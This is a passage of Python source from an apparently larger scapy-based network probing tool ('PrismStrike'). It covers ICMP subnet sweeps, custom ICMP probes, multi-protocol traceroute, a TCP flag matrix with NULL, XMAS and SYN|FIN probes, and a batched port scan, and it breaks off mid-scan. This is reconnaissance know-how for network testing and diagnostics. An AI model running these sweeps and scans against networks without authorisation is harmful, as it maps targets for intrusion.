                if icmp_type == 3:
                    if icmp_code == 3:
                        review["verdict"] = "PORT-UNREACHABLE"
                    elif icmp_code in (9, 10, 13):
                        review["verdict"] = "ADMIN-PROHIBITED"
                    else:
                        review["verdict"] = "HOST/NET-UNREACHABLE"
                    review["detail"] = "ICMP %s (%s)" % (type_name, code_name or "code %d" % icmp_code)
                elif icmp_type == 11:
                    review["verdict"] = "TTL-EXCEEDED"
                    review["detail"] = "ICMP %s (%s)" % (type_name, code_name or "code %d" % icmp_code)
                elif icmp_type == 0:
                    review["verdict"] = "ECHO-REPLY"
                    review["detail"] = "ICMP %s - host is alive" % type_name
                elif icmp_type in (14, 18):
                    review["verdict"] = "TIMESTAMP/MASK-REPLY"
                    review["detail"] = "ICMP %s - granular response received" % type_name
                else:
                    review["verdict"] = "ICMP-%d" % icmp_type
                    review["detail"] = "ICMP %s (%s)" % (type_name, code_name or "code %d" % icmp_code)
            elif response.haslayer(UDP):
                review["verdict"] = "UDP-RESPONSE"
                review["detail"] = "UDP reply from %s:%s" % (
                    review["source"], response[UDP].sport)
            else:
                review["verdict"] = "LAYER-2/OTHER"
                review["detail"] = "Non-IP reply (ARP or raw frame) observed"
        except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
            review["verdict"] = "PARSE-ERROR"
            review["detail"] = "response parsing failed: %s" % exc
        return review


class TrafficStats:
    """Sent/received/loss/RTT accumulator shared by the active probe modules."""

    def __init__(self, label: str = "session") -> None:
        self.label = label
        # Counters and the RTT sample list are guarded by this lock: capture
        # callbacks run on scapy's sniffer thread while the owning module reads
        # and renders the same object from the calling thread.
        self._lock = threading.RLock()
        self.sent = 0
        self.received = 0
        # Bounded horizon: a long, high-rate stress run must not leak memory, and
        # the running total keeps the true reply count available for reporting.
        self.rtts: "deque[float]" = deque(maxlen=TRAFFIC_RTT_HORIZON)
        self.rtts_seen = 0
        self.icmp_unreachable = 0
        self.timeouts = 0
        self.errors = 0
        self.first_sent_at: Optional[float] = None
        self.last_rtt_at: Optional[float] = None
        self.started_at = time.time()
        self.stopped_at: Optional[float] = None

    def record_send(self) -> None:
        with self._lock:
            self.sent += 1
            if self.first_sent_at is None:
                self.first_sent_at = time.time()

    def record_reply(self, rtt_ms: Optional[float], unreachable: bool = False) -> None:
        with self._lock:
            self.received += 1
            if unreachable:
                self.icmp_unreachable += 1
            if rtt_ms is not None:
                self.rtts.append(float(rtt_ms))
                self.rtts_seen += 1
                self.last_rtt_at = time.time()

    def record_timeout(self) -> None:
        with self._lock:
            self.timeouts += 1

    def record_error(self) -> None:
        with self._lock:
            self.errors += 1

    def stop(self) -> None:
        with self._lock:
            self.stopped_at = time.time()

    @property
    def loss_percent(self) -> float:
        with self._lock:
            sent = self.sent
            received = self.received
        if sent <= 0:
            return 0.0
        lost = max(0, sent - received)
        return round((lost / float(sent)) * 100.0, 2)

    def rtt_summary(self) -> Dict[str, float]:
        with self._lock:
            samples = list(self.rtts)
        if not samples:
            return {"min": 0.0, "avg": 0.0, "max": 0.0, "jitter": 0.0}
        ordered = sorted(samples)
        avg = sum(ordered) / float(len(ordered))
        jitter = 0.0
        if len(ordered) > 1:
            diffs = [abs(ordered[i] - ordered[i - 1]) for i in range(1, len(ordered))]
            jitter = sum(diffs) / float(len(diffs))
        return {
            "min": round(ordered[0], 3),
            "avg": round(avg, 3),
            "max": round(ordered[-1], 3),
            "jitter": round(jitter, 3),
        }

    def report(self) -> Dict[str, Any]:
        with self._lock:
            stopped_at = self.stopped_at
            sent = self.sent
            received = self.received
            timeouts = self.timeouts
            unreachable = self.icmp_unreachable
            errors = self.errors
            rtt_samples = len(self.rtts)
            rtt_total = self.rtts_seen
        elapsed = (stopped_at or time.time()) - self.started_at
        rtt = self.rtt_summary()
        return OrderedDict([
            ("label", self.label),
            ("packets_sent", sent),
            ("packets_received", received),
            ("timeouts", timeouts),
            ("icmp_unreachable", unreachable),
            ("errors", errors),
            ("loss_percent", self.loss_percent),
            ("elapsed_seconds", round(elapsed, 3)),
            ("pps", round(sent / elapsed, 2) if elapsed > 0 else 0.0),
            ("rtt_ms", rtt),
            ("rtt_samples_retained", rtt_samples),
            ("rtt_samples_total", rtt_total),
        ])

    def render(self) -> None:
        report = self.report()
        rtt = report["rtt_ms"]
        heading("TRAFFIC SUMMARY - %s" % self.label.upper())
        kv_table([
            ("Packets transmitted", report["packets_sent"]),
            ("Packets received", report["packets_received"]),
            ("Timeouts / no reply", report["timeouts"]),
            ("ICMP unreachable", report["icmp_unreachable"]),
            ("Packet loss", "%s%%" % report["loss_percent"]),
            ("Elapsed", format_duration(report["elapsed_seconds"])),
            ("Throughput", "%s pkt/s" % report["pps"]),
            ("RTT min/avg/max", "%.3f / %.3f / %.3f ms" % (rtt["min"], rtt["avg"], rtt["max"])),
            ("RTT jitter (mdev)", "%.3f ms" % rtt["jitter"]),
        ])



# ===========================================================================
# MODULE 1 - ICMP RECONNAISSANCE (custom ping sweeps + granular probes)
# ===========================================================================
def _icmp_sr_send(packets: List[Any], timeout: float, retries: int,
                  interval: float, iface: Optional[str]) -> Tuple[Any, Any]:
    """Execute a batch sr() exchange with full error containment."""
    if not packets:
        raise FrameworkError("no packets were constructed for this exchange")
    sr_kwargs: Dict[str, Any] = {
        "timeout": max(0.05, float(timeout)),
        "retry": max(0, int(retries)),
        "inter": max(0.0, float(interval)),
        "verbose": 0,
    }
    restore_iface = None
    if iface:
        # sr() rejects iface= whenever the argument is a packet list, so the
        # interface is bound by scoping every destination address instead
        bound = False
        if scapy_scoped_ip is not None:
            try:
                for packet in packets:
                    packet[IP].dst = scapy_scoped_ip(packet[IP].dst, scope=iface)
                bound = True
            except (AttributeError, IndexError, KeyError, TypeError, ValueError):
                bound = False
        if not bound:
            # last resort for very old scapy: pin the default interface for the
            # duration of the exchange, then put it back exactly as it was
            try:
                restore_iface = scapy_conf.iface
                scapy_conf.iface = iface
            except (AttributeError, ValueError):
                restore_iface = None
    try:
        answered, unanswered = sr(packets, **sr_kwargs)
    except PermissionError:
        raise FrameworkError("raw socket permission denied - run as root/administrator")
    except AttributeError as exc:
        raise FrameworkError("interface binding failed for %s: %s" % (iface, exc))
    except OSError as exc:
        raise FrameworkError("transmit failed: %s" % exc)
    finally:
        if restore_iface is not None:
            try:
                scapy_conf.iface = restore_iface
            except (AttributeError, ValueError):
                pass
    return answered, unanswered


def icmp_sweep(network: ipaddress.IPv4Network, timeout: float = DEFAULT_TIMEOUT,
               retries: int = 1, interval: float = 0.002, iface: Optional[str] = None,
               payload: bytes = b"PrismStrike-SWEEP", chunk_size: int = 64) -> Dict[str, Any]:
    """
    Custom ICMP echo-request sweep across a CIDR range.

    Builds each probe by hand (IP/ICMP/Raw), batches the exchange through
    scapy's sr() engine and classifies every answer with ReplyReviewer so
    that ICMP-unreachable responses are distinguished from true liveness.
    """
    if not require_scapy("ICMP sweep"):
        raise FrameworkError("scapy unavailable")
    hosts = iter_hosts(network)
    if not hosts:
        raise FrameworkError("network %s yields no probeable hosts" % network)
    stats = TrafficStats("icmp-sweep %s" % network)
    live: List[Dict[str, Any]] = []
    identified: List[Dict[str, Any]] = []
    note("sweeping %d host(s) in %s with ICMP echo requests (timeout %.2fs, retries %d)"
         % (len(hosts), network, timeout, retries))
    identifier = random.randint(0, 0xFFFF)
    try:
        for start in range(0, len(hosts), max(1, chunk_size)):
            batch = hosts[start:start + max(1, chunk_size)]
            probes = []
            for index, host in enumerate(batch):
                try:
                    probe = PacketBuilder.icmp(
                        host, icmp_type=8, code=0, ident=identifier,
                        seq=(start + index) & 0xFFFF, payload=payload)
                    probes.append(probe)
                except FrameworkError as exc:
                    stats.record_error()
                    LOGGER.event("warn", "probe construction failed for %s: %s" % (host, exc), level="WARN")
            if not probes:
                continue
            before = stats.sent
            stats.sent += len(probes)
            if stats.first_sent_at is None:
                stats.first_sent_at = time.time()
            try:
                answered, unanswered = _icmp_sr_send(probes, timeout, retries, interval, iface)
            except FrameworkError as exc:
                stats.errors += len(probes)
                err("sweep batch failed: %s" % exc)
                continue
            seen_hosts: Dict[str, Any] = {}
            for sent_packet, received_packet in answered:
                target_host = sent_packet[IP].dst
                review = ReplyReviewer.review(received_packet, getattr(sent_packet, "sent_time", None))
                if review["verdict"] == "ECHO-REPLY":
                    stats.record_reply(review["rtt_ms"])
                elif review["verdict"] in ("HOST/NET-UNREACHABLE", "ADMIN-PROHIBITED"):
                    stats.record_reply(review["rtt_ms"], unreachable=True)
                else:
                    stats.record_reply(review["rtt_ms"])
                if target_host in seen_hosts:
                    continue
                seen_hosts[target_host] = review
                record = OrderedDict([
                    ("host", target_host),
                    ("responder", review["source"]),
                    ("verdict", review["verdict"]),
                    ("ttl", review["ttl"]),
                    ("rtt_ms", review["rtt_ms"]),
                    ("detail", review["detail"]),
                ])
                identified.append(record)
                if review["verdict"] == "ECHO-REPLY":
                    live.append(record)
                out("  %s %-16s ttl=%-4s rtt=%-9s %s" % (
                    c("ALIVE ", "bgreen", "bold") if review["verdict"] == "ECHO-REPLY"
                    else c("REJECT", "byellow"),
                    target_host,
                    review["ttl"],
                    ("%s ms" % review["rtt_ms"]) if review["rtt_ms"] is not None else "-",
                    c(review["detail"], "grey"),
                ))
            missed = len(batch) - len(seen_hosts)
            if missed > 0:
                stats.timeouts += missed
            progress = min(100.0, ((start + len(batch)) / float(len(hosts))) * 100.0)
            out(c("  ...progress %5.1f%%  (%d/%d probed, %d alive)"
                  % (progress, start + len(batch), len(hosts), len(live)), "grey"))
            del before
    except KeyboardInterrupt:
        warn("sweep interrupted by operator - compiling partial results.")
        LOGGER.event("interrupt", "ICMP sweep interrupted", level="WARN")
    stats.stop()
    stats.render()
    summary = OrderedDict([
        ("network", str(network)),
        ("hosts_probed", len(hosts)),
        ("hosts_answering", len(identified)),
        ("hosts_alive", len(live)),
        ("live_hosts", [entry["host"] for entry in live]),
        ("responses", identified),
        ("traffic", stats.report()),
        ("options", {"timeout": timeout, "retries": retries, "interval": interval,
                     "iface": iface or "auto", "payload_len": len(payload)}),
    ])
    artifact = LOGGER.scan("icmp_sweep", summary, target=str(network))
    if artifact:
        note("artefact: %s" % artifact)
    if live:
        heading("LIVE HOST SUMMARY")
        for entry in live:
            out("  %s  %s" % (c(entry["host"].ljust(16), "bgreen"),
                              c("ttl=%s rtt=%sms" % (entry["ttl"], entry["rtt_ms"]), "grey")))
        if alerts_armed():
            for entry in live[:200]:
                alert_host_up(entry["host"], entry.get("rtt_ms"), entry.get("ttl"))
    else:
        warn("no ICMP echo replies received - hosts may be ICMP-filtered (try the TCP crafter).")
    LOGGER.event("scan", "ICMP sweep complete: %d/%d hosts alive in %s"
                 % (len(live), len(hosts), network),
                 data={"alive": len(live), "probed": len(hosts)})
    return summary


def icmp_granular_probe(target: str, icmp_type: int, code: int, count: int = 4,
                        timeout: float = DEFAULT_TIMEOUT, interval: float = DEFAULT_INTERVAL,
                        ttl: int = 64, payload: bytes = b"PrismStrike-GRANULAR",
                        iface: Optional[str] = None) -> Dict[str, Any]:
    """Send `count` probes (optionally non-echo ICMP types) and report each answer."""
    if not require_scapy("ICMP granular probe"):
        raise FrameworkError("scapy unavailable")
    stats = TrafficStats("icmp-probe %s type=%d" % (target, icmp_type))
    results: List[Dict[str, Any]] = []
    identifier = random.randint(0, 0xFFFF)
    for sequence in range(1, max(1, count) + 1):
        try:
            packet = PacketBuilder.icmp(target, icmp_type=icmp_type, code=code,
                                        ident=identifier, seq=sequence,
                                        payload=payload, ttl=ttl)
        except FrameworkError as exc:
            stats.record_error()
            err("probe %d could not be built: %s" % (sequence, exc))
            continue
        stats.record_send()
        sent_at = time.time()
        try:
            kwargs: Dict[str, Any] = {"timeout": max(0.05, timeout), "verbose": 0}
            if iface:
                kwargs["iface"] = iface
            reply = sr1(packet, **kwargs)
        except PermissionError:
            raise FrameworkError("raw socket permission denied - escalate privileges")
        except OSError as exc:
            stats.record_error()
            err("probe %d transmit error: %s" % (sequence, exc))
            continue
        review = ReplyReviewer.review(reply, sent_at)
        if reply is None:
            stats.record_timeout()
        else:
            stats.record_reply(review["rtt_ms"], unreachable=review["verdict"].endswith("UNREACHABLE"))
        record = OrderedDict([
            ("sequence", sequence),
            ("target", target),
            ("icmp_type_sent", icmp_type),
            ("icmp_code_sent", code),
            ("verdict", review["verdict"]),
            ("source", review["source"]),
            ("ttl", review["ttl"]),
            ("rtt_ms", review["rtt_ms"]),
            ("detail", review["detail"]),
        ])
        results.append(record)
        colour = "bgreen" if review["verdict"] in ("ECHO-REPLY", "TIMESTAMP/MASK-REPLY") else (
            "byellow" if review["verdict"] != "NO-RESPONSE" else "grey")
        out("  seq=%-3d %s src=%-15s ttl=%-4s rtt=%-10s %s" % (
            sequence, c("%-18s" % review["verdict"], colour), review["source"], review["ttl"],
            ("%s ms" % review["rtt_ms"]) if review["rtt_ms"] is not None else "-",
            c(review["detail"], "grey")))
        if reply is not None:
            packet_bytes = bytes(reply)
            out(hexdump(packet_bytes, max_bytes=64))
        if interval > 0 and sequence < count:
            try:
                time.sleep(min(interval, 60.0))
            except KeyboardInterrupt:
                warn("probe loop interrupted.")
                break
    stats.stop()
    stats.render()
    summary = OrderedDict([
        ("target", target),
        ("icmp_type", icmp_type),
        ("icmp_code", code),
        ("payload_hex", payload[:32].hex()),
        ("traffic", stats.report()),
        ("probes", results),
        ("options", {"count": count, "timeout": timeout, "interval": interval,
                     "ttl": ttl, "iface": iface or "auto"}),
    ])
    artifact = LOGGER.scan("icmp_probe", summary, target=target)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def icmp_traceroute(target: str, max_hops: int = 30, protocol: str = "icmp",
                    timeout: float = 2.0, probes_per_hop: int = 2,
                    iface: Optional[str] = None) -> Dict[str, Any]:
    """
    Incremental-TTL path discovery implemented natively with scapy sr1().

    Protocol modes: 'icmp' (echo requests), 'udp' (high ports, classic
    traceroute), 'tcp' (SYN to 80/443, traverses most stateful firewalls).
    """
    if not require_scapy("ICMP traceroute"):
        raise FrameworkError("scapy unavailable")
    note("traceroute -> %s  (mode=%s, max_hops=%d, %.0fs/hop)"
         % (target, protocol, max_hops, timeout))
    hops: List[Dict[str, Any]] = []
    stats = TrafficStats("traceroute %s" % target)
    reached = False
    for ttl in range(1, max(1, max_hops) + 1):
        hop_reviews: List[Dict[str, Any]] = []
        for attempt in range(max(1, probes_per_hop)):
            try:
                if protocol == "udp":
                    packet = PacketBuilder.udp(target, 33434 + ttl, payload=b"PrismStrike-TRACE", ttl=ttl)
                elif protocol == "tcp":
                    packet = PacketBuilder.tcp(target, 443 if ttl % 2 else 80, flags="S", ttl=ttl)
                else:
                    packet = PacketBuilder.icmp(target, icmp_type=8, seq=ttl,
                                                ident=random.randint(0, 0xFFFF),
                                                payload=b"PrismStrike-TRACE", ttl=ttl)
            except FrameworkError as exc:
                stats.record_error()
                err("hop %d probe build failed: %s" % (ttl, exc))
                break
            stats.record_send()
            sent_at = time.time()
            try:
                kwargs: Dict[str, Any] = {"timeout": max(0.1, timeout), "verbose": 0}
                if iface:
                    kwargs["iface"] = iface
                reply = sr1(packet, **kwargs)
            except (OSError, PermissionError) as exc:
                stats.record_error()
                err("hop %d transmit error: %s" % (ttl, exc))
                break
            review = ReplyReviewer.review(reply, sent_at)
            if reply is None:
                stats.record_timeout()
            else:
                stats.record_reply(review["rtt_ms"])
            hop_reviews.append(review)
        if not hop_reviews:
            break
        responders = [r for r in hop_reviews if r["verdict"] != "NO-RESPONSE"]
        if responders:
            source = responders[0]["source"]
            rtts = [r["rtt_ms"] for r in responders if r["rtt_ms"] is not None]
            verdicts = ",".join(sorted(set(r["verdict"] for r in responders)))
            rtt_text = "%.3f ms" % (sum(rtts) / len(rtts)) if rtts else "*"
            out("  %2d  %-16s %-24s %s" % (
                ttl, source, c(rtt_text, "bgreen"), c(verdicts, "grey")))
            hop_entry = OrderedDict([
                ("hop", ttl),
                ("address", source),
                ("rtt_ms", round(sum(rtts) / len(rtts), 3) if rtts else None),
                ("verdicts", sorted(set(r["verdict"] for r in responders))),
            ])
            try:
                with open("/etc/hosts", "r", encoding="utf-8", errors="ignore") as hosts_file:
                    hosts_blob = hosts_file.read()
                if source in hosts_blob:
                    hop_entry["hosts_hint"] = source
            except OSError:
                pass
            hops.append(hop_entry)
            if source == target or any(
                    r["verdict"] in ("ECHO-REPLY", "TIMESTAMP/MASK-REPLY", "OPEN", "CLOSED",
                                     "PORT-UNREACHABLE", "UDP-RESPONSE")
                    for r in responders):
                out("  %s" % c("destination reached at hop %d" % ttl, "bgreen", "bold"))
                reached = True
                break
        else:
            out("  %2d  %s" % (ttl, c("*  *  *  (no response - filtered hop)", "grey")))
            hops.append(OrderedDict([("hop", ttl), ("address", "*"), ("rtt_ms", None),
                                     ("verdicts", ["NO-RESPONSE"])]))
    stats.stop()
    summary = OrderedDict([
        ("target", target),
        ("protocol", protocol),
        ("max_hops", max_hops),
        ("destination_reached", reached),
        ("hops", hops),
        ("traffic", stats.report()),
    ])
    artifact = LOGGER.scan("traceroute", summary, target=target)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


@module_guard("ICMP Reconnaissance")
@root_required
def module_icmp_recon(args: Optional[List[str]] = None) -> None:
    """Interactive ICMP suite: sweeps, multi-host probes, granular types, traceroute."""
    actions = OrderedDict([
        ("1", "ICMP ping sweep over a subnet"),
        ("2", "Multi-host ICMP probe (comma/space separated targets)"),
        ("3", "Granular ICMP probe (custom type/code/TTL/payload/count)"),
        ("4", "ICMP/UDP/TCP traceroute to a single target"),
        ("5", "Quick local-subnet sweep (auto-detected interface)"),
        ("6", "ONLINE: enrich targets (RDAP ownership, PTR, DoH-safe resolution)"),
        ("0", "Return to main menu"),
    ])
    while True:
        heading("MODULE 01 - ICMP RECONNAISSANCE")
        for key, label in actions.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("icmp> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "6":
            online_recon_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            raw = prompt_text("network (e.g. 192.168.1.0/24 or 10.0.0.5/32)")
            if raw is PROMPT_ABORT:
                continue
            try:
                network = parse_network(raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            timeout = prompt_float("per-batch timeout seconds", 0.1, 120.0, DEFAULT_TIMEOUT)
            if timeout is PROMPT_ABORT:
                continue
            retries = prompt_int("transmit retries", 0, 10, 1)
            if retries is PROMPT_ABORT:
                continue
            interval = prompt_float("inter-packet interval seconds", 0.0, 5.0, 0.002)
            if interval is PROMPT_ABORT:
                continue
            iface = prompt_text("interface (blank = auto)", default="", allow_blank=True)
            if iface is PROMPT_ABORT:
                continue
            payload_raw = prompt_text("payload text", default="PrismStrike-SWEEP")
            if payload_raw is PROMPT_ABORT:
                continue
            icmp_sweep(network, timeout=float(timeout), retries=int(retries),
                       interval=float(interval), iface=str(iface) or None,
                       payload=str(payload_raw).encode("utf-8", "replace"))
        elif choice == "2":
            raw = prompt_text("targets (space or comma separated IPv4 addresses)")
            if raw is PROMPT_ABORT:
                continue
            candidates = [token for token in re.split(r"[,\s]+", str(raw)) if token]
            targets: List[str] = []
            for token in candidates:
                try:
                    targets.append(parse_ipv4(token))
                except FrameworkError as exc:
                    warn("skipping '%s': %s" % (token, exc))
            if not targets:
                err("no valid targets supplied.")
                continue
            count = prompt_int("probes per target", 1, 100, 3)
            if count is PROMPT_ABORT:
                continue
            timeout = prompt_float("timeout seconds", 0.1, 120.0, DEFAULT_TIMEOUT)
            if timeout is PROMPT_ABORT:
                continue
            for target in targets:
                out("")
                note("target: %s" % target)
                icmp_granular_probe(target, icmp_type=8, code=0, count=int(count),
                                    timeout=float(timeout))
        elif choice == "3":
            target_raw = prompt_text("target IPv4 address")
            if target_raw is PROMPT_ABORT:
                continue
            try:
                target = parse_ipv4(target_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            out(c("  common ICMP types: 0 echo-reply | 3 unreachable | 8 echo-request | "
                  "11 time-exceeded | 13 timestamp-req | 17 mask-req", "grey"))
            type_raw = prompt_int("icmp type", 0, 255, 8)
            if type_raw is PROMPT_ABORT:
                continue
            code_raw = prompt_int("icmp code", 0, 255, 0)
            if code_raw is PROMPT_ABORT:
                continue
            count = prompt_int("probe count", 1, 1000, 4)
            if count is PROMPT_ABORT:
                continue
            timeout = prompt_float("timeout seconds", 0.1, 120.0, DEFAULT_TIMEOUT)
            if timeout is PROMPT_ABORT:
                continue
            interval = prompt_float("interval seconds", 0.0, 60.0, DEFAULT_INTERVAL)
            if interval is PROMPT_ABORT:
                continue
            ttl = prompt_int("TTL", 1, 255, 64)
            if ttl is PROMPT_ABORT:
                continue
            payload_raw = prompt_text("payload text", default="PrismStrike-GRANULAR")
            if payload_raw is PROMPT_ABORT:
                continue
            icmp_granular_probe(target, int(type_raw), int(code_raw), int(count),
                                float(timeout), float(interval), int(ttl),
                                str(payload_raw).encode("utf-8", "replace"))
        elif choice == "4":
            target_raw = prompt_text("target IPv4 address or hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("could not resolve '%s'." % target_raw)
                continue
            protocol = prompt_choice("probe protocol", ["icmp", "udp", "tcp"], "icmp")
            if protocol is PROMPT_ABORT:
                continue
            max_hops = prompt_int("maximum hops", 1, 64, 30)
            if max_hops is PROMPT_ABORT:
                continue
            probes = prompt_int("probes per hop", 1, 5, 2)
            if probes is PROMPT_ABORT:
                continue
            timeout = prompt_float("per-hop timeout seconds", 0.2, 10.0, 2.0)
            if timeout is PROMPT_ABORT:
                continue
            icmp_traceroute(target, int(max_hops), str(protocol), float(timeout), int(probes))
        elif choice == "5":
            local = InterfaceManager.local_network()
            if local is None:
                err("local subnet could not be derived - use option [1] with an explicit CIDR.")
                continue
            note("auto-detected local subnet: %s" % local)
            icmp_sweep(local)
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 2 - TCP FLAG CRAFTER (SYN / ACK / FIN / RST / PSH and combinations)
# ===========================================================================
def _tcp_exchange(packets: List[Any], timeout: float, retries: int, interval: float,
                  iface: Optional[str]) -> Tuple[List[Tuple[Any, Any, Any]], List[Any]]:
    """Run a point-to-multipoint sr() exchange and return (sent, recv, review) triples."""
    if not packets:
        raise FrameworkError("no packets constructed")
    kwargs: Dict[str, Any] = {
        "timeout": max(0.05, float(timeout)),
        "retry": max(0, int(retries)),
        "inter": max(0.0, float(interval)),
        "verbose": 0,
    }
    if iface:
        kwargs["iface"] = iface
    try:
        answered, unanswered = sr(packets, **kwargs)
    except PermissionError:
        raise FrameworkError("raw socket permission denied - escalate privileges")
    except OSError as exc:
        raise FrameworkError("transmit failure: %s" % exc)
    triples: List[Tuple[Any, Any, Any]] = []
    for sent_packet, received_packet in answered:
        triples.append((sent_packet, received_packet,
                        ReplyReviewer.review(received_packet, getattr(sent_packet, "sent_time", None))))
    return triples, list(unanswered)


def tcp_probe(target: str, port: int, flags: str = "S", timeout: float = DEFAULT_TIMEOUT,
              retries: int = 0, interval: float = 0.0, ttl: int = 64, window: int = 64240,
              payload: bytes = b"", df: bool = False, tos: int = 0,
              iface: Optional[str] = None) -> Dict[str, Any]:
    """Send one crafted TCP segment with an arbitrary flag mask and review the answer."""
    if not require_scapy("TCP probe"):
        raise FrameworkError("scapy unavailable")
    stats = TrafficStats("tcp %s:%d flags=%s" % (target, port, flags or "NULL"))
    packet = PacketBuilder.tcp(target, port, flags=flags, ttl=ttl, window=window,
                               payload=payload, df=df, tos=tos)
    stats.record_send()
    triples, unanswered = _tcp_exchange([packet], timeout, retries, interval, iface)
    verdict: Dict[str, Any]
    if triples:
        sent_packet, received_packet, review = triples[0]
        stats.record_reply(review["rtt_ms"])
        verdict = review
        verdict["packet_sent"] = PacketBuilder.packet_fingerprint(packet)
        verdict["packet_recv"] = PacketBuilder.packet_fingerprint(received_packet)
        verdict["responder_port"] = int(received_packet[TCP].sport) if received_packet.haslayer(TCP) else None
    else:
        stats.record_timeout()
        verdict = OrderedDict([
            ("verdict", "NO-RESPONSE"),
            ("detail", "No answer within %.2fs (filtered, dropped or host down)" % timeout),
            ("source", "-"), ("ttl", "-"), ("flags", "-"), ("icmp", "-"), ("rtt_ms", None),
            ("packet_sent", PacketBuilder.packet_fingerprint(packet)),
        ])
    stats.stop()
    colour = {"OPEN": "bgreen", "CLOSED": "byellow", "UNFILTERED": "bcyan",
              "PORT-UNREACHABLE": "byellow", "ADMIN-PROHIBITED": "bred",
              "TTL-EXCEEDED": "bcyan"}.get(verdict["verdict"], "grey")
    out("  target   : %s:%d   flags=%s" % (target, port, flags or "NULL(\"\")"))
    out("  verdict  : %s   %s" % (c(verdict["verdict"], colour, "bold"), c(verdict["detail"], "grey")))
    out("  responder: %s  ttl=%s  rtt=%s" % (
        verdict["source"], verdict["ttl"],
        ("%s ms" % verdict["rtt_ms"]) if verdict["rtt_ms"] is not None else "-"))
    out("  sent pkt : %s" % c(verdict["packet_sent"], "grey"))
    if verdict.get("packet_recv"):
        out("  recv pkt : %s" % c(verdict["packet_recv"], "grey"))
    stats.render()
    summary = OrderedDict([
        ("mode", "single-probe"),
        ("target", target),
        ("port", port),
        ("flags_sent", flags),
        ("result", verdict),
        ("traffic", stats.report()),
        ("options", {"timeout": timeout, "retries": retries, "ttl": ttl, "window": window,
                     "df": df, "tos": tos, "payload_len": len(payload),
                     "iface": iface or "auto"}),
    ])
    artifact = LOGGER.scan("tcp_probe", summary, target="%s:%d" % (target, port))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def tcp_flag_matrix(target: str, port: int, timeout: float = DEFAULT_TIMEOUT,
                    iface: Optional[str] = None) -> Dict[str, Any]:
    """Fire every classic flag set at one port and tabulate the differential response."""
    if not require_scapy("TCP flag matrix"):
        raise FrameworkError("scapy unavailable")
    matrix = OrderedDict([
        ("SYN", "S"), ("ACK", "A"), ("FIN", "F"), ("RST", "R"), ("PSH", "P"),
        ("URG", "U"), ("SYN|ACK", "SA"), ("FIN|PSH", "FP"), ("FIN|PSH|URG", "FPU"),
        ("NULL", ""), ("XMAS", "FPU"), ("SYN|FIN", "SF"),
    ])
    note("flag matrix against %s:%d (%d probes)" % (target, port, len(matrix)))
    rows: List[Dict[str, Any]] = []
    stats = TrafficStats("flag-matrix %s:%d" % (target, port))
    for label, flags in matrix.items():
        try:
            packet = PacketBuilder.tcp(target, port, flags=flags)
        except FrameworkError as exc:
            stats.record_error()
            err("%s: %s" % (label, exc))
            continue
        stats.record_send()
        triples, _ = _tcp_exchange([packet], timeout, 0, 0.0, iface)
        if triples:
            _, received_packet, review = triples[0]
            stats.record_reply(review["rtt_ms"])
            rows.append(OrderedDict([
                ("flags_label", label), ("flags_mask", flags or "NULL"),
                ("verdict", review["verdict"]), ("responder_flags", review["flags"]),
                ("source", review["source"]), ("ttl", review["ttl"]),
                ("rtt_ms", review["rtt_ms"]), ("detail", review["detail"]),
            ]))
            out("  %-12s -> %-18s %-14s ttl=%-4s %s" % (
                label,
                c(review["verdict"], "bgreen" if review["verdict"] == "OPEN" else "byellow"),
                c(review["flags"], "cyan"), review["ttl"],
                c(review["detail"], "grey")))
        else:
            stats.record_timeout()
            rows.append(OrderedDict([
                ("flags_label", label), ("flags_mask", flags or "NULL"),
                ("verdict", "NO-RESPONSE"), ("responder_flags", "-"),
                ("source", "-"), ("ttl", "-"), ("rtt_ms", None),
                ("detail", "silence - dropped by stack or middlebox"),
            ]))
            out("  %-12s -> %s" % (label, c("NO-RESPONSE", "grey")))
    stats.stop()
    stats.render()
    summary = OrderedDict([
        ("mode", "flag-matrix"),
        ("target", target), ("port", port),
        ("results", rows),
        ("traffic", stats.report()),
    ])
    artifact = LOGGER.scan("tcp_flag_matrix", summary, target="%s:%d" % (target, port))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def tcp_port_scan(target: str, ports: Sequence[int], flags: str = "S",
                  timeout: float = DEFAULT_TIMEOUT, retries: int = 0,
                  interval: float = 0.0, iface: Optional[str] = None,
                  show_closed: bool = False) -> Dict[str, Any]:
    """Flag-agnostic TCP sweep across an explicit port list using batched sr()."""
    if not require_scapy("TCP port scan"):
        raise FrameworkError("scapy unavailable")
    port_list = [port for port in ports if 0 <= port <= 65535][:MAX_TCP_PROBES]
    if not port_list:
        raise FrameworkError("no usable ports supplied")
    note("crafting %d TCP probe(s) with flags '%s' against %s"
         % (len(port_list), flags or "NULL", target))
    stats = TrafficStats("tcp-scan %s flags=%s" % (target, flags or "NULL"))
    results: List[Dict[str, Any]] = []
    open_ports: List[Dict[str, Any]] = []
    closed_ports: List[Dict[str, Any]] = []
    filtered_ports: List[int] = []
    probes: List[Any] = []
    for port in port_list:
        try:
            probes.append(PacketBuilder.tcp(target, port, flags=flags))
        except FrameworkError as exc:
            stats.record_error()
            LOGGER.event("warn", "probe build failed for port %d: %s" % (port, exc), level="WARN")
    stats.sent += len(probes)
    stats.first_sent_at = time.time()
    answered_triples: List[Tuple[Any, Any, Any]] = []
    try:
        answered_triples, unanswered = _tcp_exchange(probes, timeout, retries, interval, iface)
    except FrameworkError as exc:
        err(str(exc))
    answered_ports = set()
    for sent_packet, received_packet, review in answered_triples:
        try:
            probed_port = int(sent_packet[TCP].dport)
        except (AttributeError, IndexError, TypeError):
            probed_port = -1
        answered_ports.add(probed_port)
        stats.record_reply(review["rtt_ms"])
        record = OrderedDict([
            ("port", probed_port),
            ("service", COMMON_PORTS.get(probed_port, "unknown")),
            ("verdict", review["verdict"]),
            ("responder_flags", review["flags"]),
            ("ttl", review["ttl"]),
            ("rtt_ms", review["rtt_ms"]),
            ("detail", review["detail"]),
        ])
        results.append(record)
        if review["verdict"] == "OPEN":
            open_ports.append(record)
